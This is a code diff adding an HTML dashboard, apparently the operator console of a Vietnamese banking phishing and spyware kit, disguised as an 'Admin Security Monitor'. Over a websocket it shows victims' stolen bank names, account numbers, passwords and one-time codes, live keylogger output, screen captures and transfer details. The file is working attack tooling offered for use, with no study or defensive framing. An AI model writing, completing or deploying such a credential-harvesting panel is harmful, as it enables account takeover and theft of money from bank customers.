@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Monitor - Bank Security</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #e2e8f0; }
+        .header { background: #1e293b; padding: 20px; border-bottom: 2px solid #ef4444; }
+        .header h1 { color: #ef4444; font-size: 24px; }
+        .header p { color: #94a3b8; margin-top: 5px; }
+        .container { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; }
+        .panel { background: #1e293b; border-radius: 8px; padding: 20px; border: 1px solid #334155; }
+        .panel h2 { color: #f59e0b; margin-bottom: 15px; font-size: 18px; border-bottom: 2px solid #f59e0b; padding-bottom: 10px; }
+        .log-entry { background: #0f172a; padding: 12px; margin: 10px 0; border-radius: 4px; border-left: 3px solid #3b82f6; }
+        .log-entry.critical { border-left-color: #ef4444; }
+        .log-entry.warning { border-left-color: #f59e0b; }
+        .timestamp { color: #64748b; font-size: 12px; }
+        .data { color: #22c55e; margin-top: 5px; font-family: 'Courier New', monospace; }
+        .screenshot { max-width: 100%; border-radius: 4px; margin-top: 10px; }
+        .stats { display: flex; justify-content: space-around; margin-bottom: 20px; }
+        .stat-box { background: #0f172a; padding: 15px; border-radius: 8px; text-align: center; flex: 1; margin: 0 5px; }
+        .stat-box h3 { color: #94a3b8; font-size: 14px; margin-bottom: 5px; }
+        .stat-box .number { color: #22c55e; font-size: 32px; font-weight: bold; }
+        .online-users { color: #22c55e; }
+        .alert { background: #7f1d1d; border: 1px solid #ef4444; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔒 Admin Security Monitor</h1>
+        <p>Real-time Banking Activity Surveillance</p>
+    </div>
+    
+    <div class="container">
+        <div class="panel" style="grid-column: 1 / -1;">
+            <div class="stats">
+                <div class="stat-box">
+                    <h3>Online Users</h3>
+                    <div class="number online-users" id="onlineCount">0</div>
+                </div>
+                <div class="stat-box">
+                    <h3>Login Attempts</h3>
+                    <div class="number" id="loginCount">0</div>
+                </div>
+                <div class="stat-box">
+                    <h3>Keystrokes Captured</h3>
+                    <div class="number" id="keystrokeCount">0</div>
+                </div>
+                <div class="stat-box">
+                    <h3>Screenshots</h3>
+                    <div class="number" id="screenshotCount">0</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="panel">
+            <h2>🔐 Login Attempts</h2>
+            <div id="loginAttempts"></div>
+        </div>
+        
+        <div class="panel">
+            <h2>⌨️ Keylog Data</h2>
+            <div id="keylogData"></div>
+        </div>
+        
+        <div class="panel">
+            <h2>📸 Screen Captures</h2>
+            <div id="screenCaptures"></div>
+        </div>
+        
+        <div class="panel">
+            <h2>💸 Transfer Data</h2>
+            <div id="transferData"></div>
+        </div>
+    </div>
+    
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script>
+        const socket = io(window.location.origin);
+        
+        let stats = {
+            online: 0,
+            logins: 0,
+            keystrokes: 0,
+            screenshots: 0
+        };
+        
+        socket.on('connect', () => {
+            console.log('Admin connected');
+            socket.emit('join-admin');
+        });
+        
+        socket.on('login-attempt', (data) => {
+            stats.logins++;
+            updateStats();
+            
+            const loginDiv = document.getElementById('loginAttempts');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry critical';
+            entry.innerHTML = `
+                <div class="timestamp">${new Date(data.timestamp).toLocaleString()}</div>
+                <div class="data">
+                    <strong>Bank:</strong> ${data.bank}<br>
+                    <strong>Account:</strong> ${data.account}<br>
+                    <strong>Password:</strong> ${data.password}<br>
+                    <strong>OTP:</strong> ${data.otp || 'N/A'}<br>
+                    <strong>User Agent:</strong> ${data.userAgent}
+                </div>
+            `;
+            loginDiv.insertBefore(entry, loginDiv.firstChild);
+        });
+        
+        socket.on('keylog-data', (data) => {
+            stats.keystrokes += data.length;
+            updateStats();
+            
+            const keylogDiv = document.getElementById('keylogData');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry warning';
+            
+            const keys = data.map(k => k.key).join('');
+            entry.innerHTML = `
+                <div class="timestamp">${new Date().toLocaleString()}</div>
+                <div class="data">
+                    <strong>Keys:</strong> ${keys}<br>
+                    <strong>Target:</strong> ${data[0]?.target || 'Unknown'}
+                </div>
+            `;
+            keylogDiv.insertBefore(entry, keylogDiv.firstChild);
+        });
+        
+        socket.on('screen-capture', (data) => {
+            stats.screenshots++;
+            updateStats();
+            
+            const screenDiv = document.getElementById('screenCaptures');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `
+                <div class="timestamp">${new Date(data.timestamp).toLocaleString()}</div>
+                <div class="data">
+                    <strong>URL:</strong> ${data.url}<br>
+                    <img src="${data.screenshot}" class="screenshot" alt="Screen capture">
+                </div>
+            `;
+            screenDiv.insertBefore(entry, screenDiv.firstChild);
+            
+            // Keep only last 5 screenshots
+            while (screenDiv.children.length > 5) {
+                screenDiv.removeChild(screenDiv.lastChild);
+            }
+        });
+        
+        socket.on('transfer-data', (data) => {
+            const transferDiv = document.getElementById('transferData');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry critical';
+            entry.innerHTML = `
+                <div class="timestamp">${new Date(data.timestamp).toLocaleString()}</div>
+                <div class="data">
+                    <strong>To Account:</strong> ${data.toAccount}<br>
+                    <strong>Amount:</strong> ${Number(data.amount).toLocaleString()} VNĐ
+                </div>
+            `;
+            transferDiv.insertBefore(entry, transferDiv.firstChild);
+        });
+        
+        function updateStats() {
+            document.getElementById('loginCount').textContent = stats.logins;
+            document.getElementById('keystrokeCount').textContent = stats.keystrokes;
+            document.getElementById('screenshotCount').textContent = stats.screenshots;
+        }
+        
+        // Simulate online users (in real app, track via socket connections)
+        setInterval(() => {
+            stats.online = Math.floor(Math.random() * 5) + 1;
+            document.getElementById('onlineCount').textContent = stats.online;
+        }, 5000);
+    </script>
+</body>
+</html>
